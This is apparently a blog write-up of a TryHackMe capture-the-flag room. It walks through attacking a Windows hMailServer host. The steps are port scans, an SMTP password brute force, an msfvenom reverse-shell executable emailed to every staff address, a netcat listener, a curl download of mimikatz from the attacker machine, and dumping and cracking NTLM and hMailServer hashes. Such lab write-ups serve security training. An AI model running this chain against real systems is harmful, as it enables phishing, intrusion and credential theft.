---
layout: post
title:  "You Got Mail (THM)"
date:   2025-09-24 17:52:43 -0400
author: robo.uzi
tags: [CTF, TryHackMe]
---

**Description:** You are a penetration tester who has recently been requested to perform a security assessment for Brik. You are permitted to perform active assessments on `10.10.126.65` and strictly passive reconnaissance on [brownbrick.co](https://brownbrick.co/). The scope includes only the domain and IP provided and does not include other TLDs.
## Initial Access

`nmap -p- -T5 -vv 10.10.126.65 -oN yougotmailfullnmap.txt`

```shell
nmap -sV -sC -p 25,110,135,139,143,445,587,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49675 -T4 -vv 10.10.126.65 -oN yougotmailnmap.txt
```

```shell
PORT      STATE SERVICE       REASON  VERSION  
25/tcp    open  smtp          syn-ack hMailServer smtpd  
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP  
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY  
110/tcp   open  pop3          syn-ack hMailServer pop3d  
|_pop3-capabilities: TOP USER UIDL  
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC  
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn  
143/tcp   open  imap          syn-ack hMailServer imapd  
|_imap-capabilities: IMAP4 IDLE CAPABILITY IMAP4rev1 NAMESPACE OK QUOTA completed RIGHTS=texkA0001 SORT ACL CHILDREN  
445/tcp   open  microsoft-ds? syn-ack  
587/tcp   open  smtp          syn-ack hMailServer smtpd  
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP  
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY  
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services  
| rdp-ntlm-info:    
|   Target_Name: BRICK-MAIL  
|   NetBIOS_Domain_Name: BRICK-MAIL  
|   NetBIOS_Computer_Name: BRICK-MAIL  
|   DNS_Domain_Name: BRICK-MAIL  
|   DNS_Computer_Name: BRICK-MAIL  
|   Product_Version: 10.0.17763  
|_  System_Time: 2025-09-23T17:54:04+00:00  
|_ssl-date: 2025-09-23T17:54:10+00:00; 0s from scanner time.  
| ssl-cert: Subject: commonName=BRICK-MAIL  
| Issuer: commonName=BRICK-MAIL  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2025-09-22T17:31:47  
| Not valid after:  2026-03-24T17:31:47  
| MD5:   61d3:9972:a986:920d:8e13:ea67:c19f:dc76  
| SHA-1: 2894:95f7:1a4a:8390:4d3d:34b6:59e0:7538:db59:974e  
| -----BEGIN CERTIFICATE-----  
| MIIC2DCCAcCgAwIBAgIQN7BHzMaDSLFAL83jRTKkMTANBgkqhkiG9w0BAQsFADAV  
| MRMwEQYDVQQDEwpCUklDSy1NQUlMMB4XDTI1MDkyMjE3MzE0N1oXDTI2MDMyNDE3  
| MzE0N1owFTETMBEGA1UEAxMKQlJJQ0stTUFJTDCCASIwDQYJKoZIhvcNAQEBBQAD  
| ggEPADCCAQoCggEBANPat34PHmyoDFkW/toPQ84BQN8lEtPx2xeCFYVYhS8MG5XU  
| 0I3DWrghEiQmzg9DaKT+10cNJlQK19o1n7go2HyZbZ7A+h6tPrKiOowPTVIunz5h  
| SPa7t+EHMcR5NUxIj4ADiGSh9DYayxozHPdEv4s1wFEdAk3ZebzA3uqtWAABpmG/  
| 5vy+CfnYwzrItvwPKr08tV/xPcvR8kCHJGMpeRlZTOWH3m6g2YYC+xrSuyoqL/T8  
| iTD4ngyIAF6Omb08RUfJNT1bBV1Tkp96wd7WxXR+jTUtBXJWul3GDxQrCZeImAVM  
| 8RfIoz8/99c0wo9j8simFkATGzRZzmYCOsYCyjUCAwEAAaMkMCIwEwYDVR0lBAww  
| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQCyioob  
| EUlSLSJX13csg9ETYuAmZkEdZsm0UwMMV/e5ROnx0kNkRNWzjsZO73bvEY5c2nIo  
| 3OeCYwCDlqX7TFd+KvXtN26p9PgDoVKb1vBDgu9OfVYIHNbgN44/aGdFH7LZK/Lu  
| EFZbaT3uwJPNAIP2G94zeBSJOyvvH5UlI0OGfHUfMKMLgsLWBR0ngB7mUiYMB8Kq  
| I9tFAfesXqTbW/WaLXmTPreT8qD9NQdYJvOdvmAJ9Tyakjs/K0G5dSrF09IvKzyl  
| ucnqlnxRYAY3mBhS8njlAcIt88PJWQmKQM/lNnWtEw4libLjSFxRkfwry/tov/HA  
| ecWgt0SWVRBc+DVW  
|_-----END CERTIFICATE-----  
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC  
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: 0s, deviation: 0s, median: 0s  
| smb2-security-mode:    
|   3:1:1:    
|_    Message signing enabled but not required  
| smb2-time:    
|   date: 2025-09-23T17:54:05  
|_  start_date: N/A  
| p2p-conficker:    
|   Checking for Conficker.C or higher...  
|   Check 1 (port 52954/tcp): CLEAN (Couldn't connect)  
|   Check 2 (port 40454/tcp): CLEAN (Couldn't connect)  
|   Check 3 (port 37992/udp): CLEAN (Failed to receive data)  
|   Check 4 (port 52573/udp): CLEAN (Timeout)  
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

On [https://brownbrick.co/menu.html](https://brownbrick.co/menu.html) I find 6 emails:
```shell
oaurelius@brownbrick.co
wrohit@brownbrick.co
lhedvig@brownbrick.co
tchikondi@brownbrick.co
pcathrine@brownbrick.co
fstamatis@brownbrick.co
```
I save the emails to `emails.txt` and usernames to `users.txt`.

SMB guest access is disabled:
```shell
nxc smb 10.10.126.65 -u guest -p '' --shares  
SMB  10.10.126.65  445  BRICK-MAIL  [*] Windows 10 / Server 2019 Build 17763 x64 (name:BRICK-MAIL) (domain:BRICK-MAIL) (signing:False) (SMBv1:False)  
SMB  10.10.126.65  445  BRICK-MAIL  [-] BRICK-MAIL\guest: STATUS_ACCOUNT_DISABLED
```

I run `cewl` on `https://brownbricks.co` to get a list of passwords I can use in hydra to find a login for the smtp server:
```shell
cewl -d 3 -m 3 https://brownbrick.co -w passwords.txt  
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

I dont find a login the first time I run hydra so I ask an AI to make permutations of the words, then run the command again:
```shell
hydra -L emails.txt -P passwords.txt 10.10.126.65 smtp -s 587 -t 16  
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-23 18:53:31  
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1800 login tries (l:6/p:300), ~113 tries per task  
[DATA] attacking smtp://10.10.126.65:587/  
[587][smtp] host: 10.10.126.65   login: lhedvig@brownbrick.co   password: redacted
[STATUS] 1053.00 tries/min, 1053 tries in 00:01h, 747 to do in 00:01h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

With valid creds I create a reverse shell with `msfvenom` and send it over email: 
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.66.123 LPORT=1337 -f exe -o suprise.exe
```

After some research I find I can send emails in my terminal with `sendemail`! I download it with `sudo apt install sendemail -y` and run this command to send the malicious binary:
```shell
for email in $(cat emails.txt); do sendemail -f "lhedvig@brownbrick.co" -t "$email" -u "Suprise!" -m "Suprise!" -a suprise.exe -s 10.10.126.65:25 -xu "lhedvig@brownbrick.co" -xp "redacted"; done  
Sep 23 19:06:03 parrot sendemail[4243]: Email was sent successfully!  
Sep 23 19:06:05 parrot sendemail[4244]: Email was sent successfully!  
Sep 23 19:06:08 parrot sendemail[4245]: Email was sent successfully!  
Sep 23 19:06:10 parrot sendemail[4246]: Email was sent successfully!  
Sep 23 19:06:13 parrot sendemail[4247]: Email was sent successfully!  
Sep 23 19:06:16 parrot sendemail[4248]: Email was sent successfully!
```

I set my listener with `nc -lvnp 1337` and get a reverse shell as `wrohit`:
```shell
nc -lvnp 1337  
Listening on 0.0.0.0 1337  
Connection received on 10.10.126.65 49787  
Microsoft Windows [Version 10.0.17763.1821]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
C:\Mail\Attachments>whoami  
whoami  
brick-mail\wrohit  
  
C:\Users\wrohit\Desktop>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is A8A4-C362  
  
Directory of C:\Users\wrohit\Desktop  
  
03/11/2024  05:14 AM    <DIR>          .  
03/11/2024  05:14 AM    <DIR>          ..  
03/11/2024  05:15 AM                25 flag.txt  
              1 File(s)             25 bytes  
              2 Dir(s)  13,992,218,624 bytes free  
  
C:\Users\wrohit\Desktop>type flag.txt    
type flag.txt  
redacted 
C:\Users\wrohit\Desktop>
```

I upload `mimikatz.exe` to the machine with `python3 -m http.server` and `curl`:
```shell
C:\Users\wrohit\Desktop>curl http://10.13.66.123:8000/mimikatz.exe -o mimikatz.exe                                     
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                Dload  Upload   Total   Spent    Left  Speed  
100 1059k  100 1059k    0     0   529k      0  0:00:02  0:00:02 --:--:--  464k  
  
C:\Users\wrohit\Desktop>.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"  
.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"  
  
 .#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26  
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)  
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
## \ / ##       > https://blog.gentilkiwi.com/mimikatz  
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  
 '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/  
  
mimikatz(commandline) # token::elevate  
Token Id  : 0  
User name :    
SID name  : NT AUTHORITY\SYSTEM  
  
736     {0;000003e7} 1 D 25410          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary  
-> Impersonated !  
* Process Token : {0;001e1e41} 0 D 2122057     BRICK-MAIL\wrohit       S-1-5-21-1966530601-3185510712-10604624-1014    (14g,24p)       Primary  
* Thread Token  : {0;000003e7} 1 D 2143014     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)  
  
mimikatz(commandline) # lsadump::sam  
Domain : BRICK-MAIL  
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821  
Local SID : S-1-5-21-1966530601-3185510712-10604624  
  
SAMKey : 6e708461100b4988991ce3b4d8b1784e  
  
RID  : 000001f4 (500)  
User : Administrator  
 Hash NTLM: 2dfe3378335d43f9764e581b856a662a  
  
Supplemental Credentials:  
* Primary:NTLM-Strong-NTOWF *  
   Random Value : 3d527dff081980ff09e87e492cebee23
...
```

I find four NTLM hashes. I take them to crackstation and find the the password for the user `wrohit`.

The first two questions were `What is the user flag?` and `What is the password of the user wrohit?`.

The last question is `What is the password to access the hMailServer Administrator Dashboard?`. The hint is `hMail stores passwords in MD5` so I look in the program files for the hardcoded creds. 

I find this:
```shell
C:\Program Files (x86)\hMailServer\Bin>type hMailServer.ini  
type hMailServer.ini  
[Directories]  
ProgramFolder=C:\Program Files (x86)\hMailServer  
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database  
DataFolder=C:\Program Files (x86)\hMailServer\Data  
LogFolder=C:\Program Files (x86)\hMailServer\Logs  
TempFolder=C:\Program Files (x86)\hMailServer\Temp  
EventFolder=C:\Program Files (x86)\hMailServer\Events  
[GUILanguages]  
ValidLanguages=english,swedish  
[Security]  
AdministratorPassword=redacted
[Database]  
Type=MSSQLCE  
Username=  
Password=47f104fa02185e821a83b2cfa56cf4ec  
PasswordEncryption=1  
Port=0  
Server=  
Database=hMailServer  
Internal=1
```

I take the hash to crackstation and find the final password.
